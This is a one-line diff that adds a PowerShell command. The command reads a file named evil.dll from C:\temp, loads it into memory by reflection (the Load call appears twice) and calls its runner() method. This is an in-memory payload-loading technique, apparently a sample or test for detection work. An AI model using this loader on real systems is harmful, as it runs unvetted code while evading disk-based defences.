@@ -1,0 +1,1 @@
+$dll = [System.IO.File]::ReadAllBytes("C:\temp\evil.dll"); [System.Reflection.Assembly]::Load($dll); [System.Reflection.Assembly]::Load($dll) ; [ClassLibrary1.Class1]::runner()
